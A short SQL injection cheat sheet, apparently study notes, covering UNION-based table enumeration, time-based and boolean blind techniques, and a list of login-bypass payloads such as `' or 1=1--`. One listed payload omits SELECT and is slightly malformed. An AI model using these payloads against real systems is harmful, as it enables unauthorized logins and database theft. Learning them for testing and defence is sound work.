## SQLi Trick/Tips

### In-Band
1. Try using an apostrophe or quotation mark in the field first. If you receive an error message about syntax, then you have a possible SQLi vulnerability.
2. Use `1 UNION SELECT 1` to see how many columns are available in the orginal query. Keep incrementing the columns like `1 UNION 1,2`, then `1 UNION SELECT 1,2,3`, etc.
3. Now replace the last column number with a command like `group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'`.

### Blind
* *Authentication Bypass* - Try `' OR 1=1;--` or other always true statement.
* *Boolean-based* - Deductive reasoning by generating false values until discovering actual value.
* *Time-based* - Using SLEEP statements like `UNION SELECT SLEEP(5);--`.

### Quick login bypasses
* `admin' --`
* `admin' #`
* `admin'/*`
* `' or 1=1--`
* `' or 1=1#`
* `' or 1=1/*`
* `') or '1'='1--`
* `') or ('1'='1--`
*  Login as different user (SM*)
  `UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--`
More at https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/
